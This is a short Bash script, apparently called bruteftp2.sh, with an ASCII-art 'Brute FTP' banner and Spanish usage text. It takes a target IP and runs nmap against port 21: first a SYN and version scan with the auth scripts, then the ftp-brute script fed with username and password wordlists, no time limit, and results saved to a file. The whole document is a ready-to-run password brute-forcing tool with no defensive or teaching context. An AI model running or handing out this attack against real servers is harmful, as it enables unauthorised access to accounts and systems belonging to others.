...
;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
 ...
 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
  ...
  MMM      :M  'MMMMMMMMM  Brute  FTP MMMMMMM'.MM  MM:M.    'MMMMM
...
if [ -z "$1" ]; then
        ...
        echo "Requiere nmap"
        echo "Uso.: sh bruteftp2.sh <ip>"
        echo
        exit 0
fi
echo
echo
nmap -Pn $1 $2 -sS -sV --script auth -p 21
nmap -Pn $1 $2 -p 21 --script ftp-brute --script-args userdb=usuarios0.txt,passdb=claves0.txt,unpwdb.timelimit=0 -oG resultado.txt
